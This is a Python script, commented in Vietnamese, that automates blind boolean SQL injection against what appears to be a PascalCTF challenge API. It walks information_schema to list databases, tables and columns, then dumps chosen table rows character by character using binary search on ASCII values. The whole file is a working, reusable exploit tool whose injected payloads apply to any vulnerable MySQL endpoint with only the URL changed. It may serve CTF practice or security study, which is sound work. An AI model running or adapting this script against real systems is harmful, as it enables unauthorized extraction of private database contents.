import requests
import json

# URL mục tiêu
base_url = "https://euro2024.challs.pascalctf.it/api/group-stats?id=1"


def send_payload(payload):
    """Gửi payload và kiểm tra phản hồi."""
    url_with_payload = base_url + payload
    try:
        response = requests.get(url_with_payload)
        print(f"Response Code: {response.status_code}")  # Thêm dòng này để kiểm tra mã phản hồi
        if response.status_code == 200:
            return True
        return False
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")  # In lỗi nếu có sự cố khi gửi yêu cầu
        return False


def extract_binary_search(base_payload, low, high):
    """Tìm kiếm nhị phân để trích xuất thông tin."""
    while low <= high:
        mid = (low + high) // 2
        payload = base_payload.format(operator="=", value=mid)
        if send_payload(payload):
            return mid
        payload = base_payload.format(operator=">", value=mid)
        if send_payload(payload):
            low = mid + 1
        else:
            high = mid - 1
    return None

def get_string_length(base_payload):
    """Lấy chiều dài chuỗi."""
    length = 1
    max_length = 100  # Giới hạn số lần thử để tránh vòng lặp vô tận
    while length <= max_length:
        payload = base_payload.format(length=length)
        if send_payload(payload):
            return length
        length += 1
    return None  # Trả về None nếu không tìm thấy chiều dài hợp lệ


def get_string_content(base_payload, length):
    """Trích xuất nội dung chuỗi."""
    result = ""
    for position in range(1, length + 1):
        # Sử dụng format để truyền vị trí hiện tại vào payload
        payload = base_payload.format(position=position, operator="{operator}", value="{value}")
        char_ascii = extract_binary_search(payload, 32, 126)
        if char_ascii:
            result += chr(char_ascii)
    return result



def get_database_names():
    """Lấy danh sách databases."""
    databases = []
    index = 1
    while True:
        # Lấy chiều dài của database name
        base_payload = (
            f"' AND LENGTH((SELECT schema_name FROM information_schema.schemata LIMIT {index - 1}, 1)) = {{length}}--+-"
        )
        length = get_string_length(base_payload)
        if not length:
            break
        # Lấy nội dung của database name
        base_payload_content = (
            f"' AND ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT {index - 1}, 1), {{position}}, 1)) {{operator}} {{value}}--+-"
        )
        db_name = get_string_content(base_payload_content, length)
        databases.append(db_name)
        index += 1
    return databases


def get_tables(database):
    """Lấy danh sách tables của một database."""
    tables = []
    index = 1
    while True:
        base_payload = (
            f"' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT {index - 1}, 1)) = {{length}}--+-"
        )
        length = get_string_length(base_payload)
        if not length:
            break
        base_payload_content = (
            f"' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT {index - 1}, 1), {{position}}, 1)) {{operator}} {{value}}--+-"
        )
        table_name = get_string_content(base_payload_content, length)
        tables.append(table_name)
        index += 1
    return tables


def get_columns(table, database, selected_columns=None):
    """Lấy danh sách columns của một table, chỉ lấy những cột người dùng muốn."""
    columns = []
    if selected_columns:
        # Nếu người dùng nhập vào cột, chỉ lấy các cột đó
        columns = selected_columns
    else:
        # Nếu không nhập, lấy tất cả các cột
        index = 1
        while True:
            base_payload = (
                f"' AND LENGTH((SELECT column_name FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{database}' LIMIT {index - 1}, 1)) = {{length}}--+-"
            )
            length = get_string_length(base_payload)
            if not length:
                break
            base_payload_content = (
                f"' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{database}' LIMIT {index - 1}, 1), {{position}}, 1)) {{operator}} {{value}}--+-"
            )
            column_name = get_string_content(base_payload_content, length)
            columns.append(column_name)
            index += 1
    return columns


def get_data_from_table(table, selected_columns, database):
    """Lấy dữ liệu từ một table, chỉ lấy dữ liệu của các cột người dùng yêu cầu."""
    data = []
    index = 1
    while True:
        row = {}
        for column in selected_columns:
            base_payload = (
                f"' AND LENGTH((SELECT {column} FROM {database}.{table} LIMIT {index - 1}, 1)) = {{length}}--+-"
            )
            length = get_string_length(base_payload)
            if not length:
                return data
            base_payload_content = (
                f"' AND ASCII(SUBSTRING((SELECT {column} FROM {database}.{table} LIMIT {index - 1}, 1), {{position}}, 1)) {{operator}} {{value}}--+-"
            )
            value = get_string_content(base_payload_content, length)
            row[column] = value
        data.append(row)
        index += 1
    return data

# Lấy danh sách databases
databases = get_database_names()
print("Danh sách databases:", json.dumps(databases, indent=4))

# Chọn database
database = input("Nhập tên database: ")

# Lấy danh sách tables
tables = get_tables(database)
print("Danh sách tables:", json.dumps(tables, indent=4))

# Chọn table
table = input("Nhập tên table: ")

# Lấy danh sách columns của table
columns = get_columns(table, database)
print("Danh sách columns:", json.dumps(columns, indent=4))

# Nhập các cột người dùng muốn lấy
selected_columns_input = input("Nhập các cột bạn muốn lấy (cách nhau bởi dấu phẩy): ")
selected_columns = [col.strip() for col in selected_columns_input.split(',')]

# Kiểm tra xem các cột người dùng nhập có tồn tại trong bảng không
valid_columns = [col for col in selected_columns if col in columns]
if not valid_columns:
    print("Không có cột nào hợp lệ trong bảng.")
else:
    # Lấy dữ liệu từ table chỉ cho các cột đã chọn
    data = get_data_from_table(table, valid_columns, database)
    print("Dữ liệu từ table:", json.dumps(data, indent=4))